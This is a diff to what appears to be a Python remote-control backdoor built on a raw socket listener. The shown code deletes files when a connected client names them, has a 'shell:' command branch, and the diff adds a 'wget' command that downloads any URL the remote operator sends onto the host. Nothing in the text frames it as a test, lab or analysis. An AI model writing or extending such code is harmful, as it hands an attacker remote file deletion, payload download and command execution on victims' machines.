@@ -1,10 +1,9 @@
 
-connect: str = "127.0.0.1"
-port: int = 8888
 
 import os
 import socket
 import platform
+import wget
 
 
 run_path: str = os.getcwd()
@@ -67,6 +66,12 @@ def socket_service():
                 rm_path = client_message[7:len(client_message)]
                 os.remove(rm_path)
                 http_socket.send("Delete succesful!".encode())
+                continue
+
+            if client_message.startswith("wget "):
+                wget_url = client_message[5:len(client_message)]
+                name = wget.download(wget_url,out=wget.filename_from_url(wget_url))
+                http_socket.send(("Download File:"+wget.filename_from_url(wget_url)+" Successful!").encode())
                 continue
 
             if client_message.startswith("shell:"):
